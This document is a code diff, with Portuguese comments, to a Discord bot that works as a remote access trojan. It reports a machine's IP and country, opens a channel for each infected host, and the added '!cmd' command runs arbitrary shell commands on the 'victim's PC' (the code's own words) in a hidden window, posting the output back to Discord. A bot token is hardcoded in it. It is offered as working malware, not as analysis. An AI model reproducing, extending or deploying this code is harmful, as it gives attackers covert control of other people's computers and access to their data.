@@ -9,6 +9,8 @@ import platform
 import re
 import urllib.request
 import json
+import subprocess
+import sys
 
 # Configurações
 TOKEN='MTM2NjQ2MTcwMTg0NjcyODgwNQ.GmXVk1.Z11MMSsvVkkczYpDgrf7E7_5v04MO6TlGRyB08'
@@ -18,7 +20,26 @@ GUILD_ID = 1366462091954880564
 # Intents e Client
 intents = discord.Intents.default()
 intents.message_content = True
-client = discord.Client(intents=intents)
+client = commands.Bot(command_prefix='!', intents=intents)
+
+# Função para executar comandos no PC da vítima
+def execute_command(command):
+    try:
+        if platform.system() == "Windows":
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        stdout, stderr = process.communicate()
+        
+        if stdout:
+            result = stdout.decode('utf-8', errors='replace')
+        elif stderr:
+            result = stderr.decode('utf-8', errors='replace')
+        else:
+            result = "[+] non output."
+            
+        return result
+    except Exception as e:
+        return f"Erro ao executar comando: {str(e)}"
 
 # Função para pegar IP e País (Depois mudamos de lugar)
 def get_ip_info():
@@ -49,6 +70,10 @@ async def on_ready():
     channel = await guild.create_text_channel(channel_name)
     print(f"[+] Channel Created: {channel_name}")
 
+    # Salva a sessão para comandos
+    global session_channel_id
+    session_channel_id = channel.id
+
     # Mensagem de notificação
     admin_icon = " | :gem:" if is_admin else ""
     msg = (
@@ -60,5 +85,23 @@ async def on_ready():
     # Status do bot
     status = discord.Game("Made by Apophenia, Ace")
     await client.change_presence(status=discord.Status.online, activity=status)
+
+@client.command()
+async def cmd(ctx, *, command=None):
+    if ctx.channel.id != session_channel_id:
+        return
+    
+    if not command:
+        await ctx.send("```Uso: !cmd <comando>```")
+        return    
+    
+    result = execute_command(command)
+    
+    if len(result) > 1900:
+        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
+        for i, chunk in enumerate(chunks):
+            await ctx.send(f"```[Parte {i+1}/{len(chunks)}]\n{chunk}```")
+    else:
+        await ctx.send(f"```{result}```")
 
 client.run(TOKEN)
